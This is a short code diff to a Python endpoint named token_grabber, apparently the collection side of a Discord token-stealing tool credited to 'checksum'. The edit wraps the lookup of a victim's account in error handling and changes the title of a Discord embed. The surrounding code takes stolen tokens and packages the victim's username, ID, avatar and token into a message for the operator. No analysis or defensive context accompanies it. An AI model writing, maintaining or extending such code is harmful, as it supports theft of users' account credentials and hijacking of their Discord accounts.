@@ -22,11 +22,14 @@ def token_grabber():
     if Validate.token(token) is False:
         return (jsonify(error='invalid token'), 400)
 
-    user = DiscordUser(token)
+    try:
+        user = DiscordUser(token)
+    except:
+        return
     
     embed = DiscordEmbed()
     embed.set_footer(text=f'{user.username}#{user.discriminator} • {user.id}', icon_url=f'https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.webp')
-    embed.title = '                  Token Grabber By checksum'
+    embed.set_title((chr(32)*18) + 'Token Grabber by checksum')
     embed.description = f'''```
                            Token
 ===========================================================
